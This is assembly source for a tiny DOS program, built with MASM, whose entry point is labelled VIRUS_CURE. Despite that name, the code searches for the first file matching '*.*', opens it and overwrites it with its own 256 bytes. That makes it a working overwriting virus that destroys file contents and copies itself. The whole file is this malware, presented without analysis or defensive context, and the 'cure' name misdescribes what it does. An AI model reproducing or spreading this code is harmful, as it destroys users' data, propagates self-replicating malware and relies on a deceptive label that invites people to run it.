; Code compiled under MASM ver 4.00
; Use DOS EXE2BIN to convert to .COM file
; Code assumes SI=100h, AX=00h

TITLE   DEFINE 
CODE    SEGMENT

ASSUME  CS : CODE 
ORG     100h

VIRUS_CURE: 
XCHG    CX,AX 
MOV     AH,4Eh 
MOV     DX,OFFSET File 
INT     21h

MOV     AX,3D01h 
MOV     DX,09Eh 
INT     21h 
XCHG    BX,AX

MOV     AH,40h 
MOV     DX,SI 
MOV     CX,SI 
INT     21h

RET

File: DB      '*.*',0

CODE ENDS

END VIRUS_CURE
